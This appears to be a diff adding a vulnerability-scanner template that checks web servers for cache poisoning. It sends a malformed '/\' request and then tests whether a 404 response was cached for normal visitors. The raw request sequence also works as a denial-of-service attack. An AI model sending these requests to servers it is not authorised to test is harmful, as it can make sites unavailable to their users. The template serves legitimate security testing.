@@ -1,0 +1,59 @@
+id: cache-poisoning
+
+info:
+  name: Cache Poisoning
+  author: Playtika ProdSec Team
+  severity: medium
+  description: This template detects DoS via Cache poisoning by sending a malformed request with an unsafe /\ (forward-slash and a back-slash) and then checks if web server poisons the cache with a 404.
+  tags: cache
+
+variables:
+  random: "{{rand_base(5)}}"
+  randomTwo: "{{rand_base(5)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+requests:
+  - raw:
+      - |+
+        GET /\?{{random}} HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true
+
+    matchers:
+      - type: status
+        status:
+          - 404
+        condition: and
+        internal: true
+
+
+  - raw:
+      - |+
+        GET /?{{random}} HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true
+
+    matchers:
+      - type: status
+        status:
+          - 404
+        condition: and
+        internal: true
+
+
+  - raw:
+      - |+
+        GET /?{{randomTwo}} HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true
+
+    matchers:
+      - type: status
+        status:
+          - 200
+        condition: and
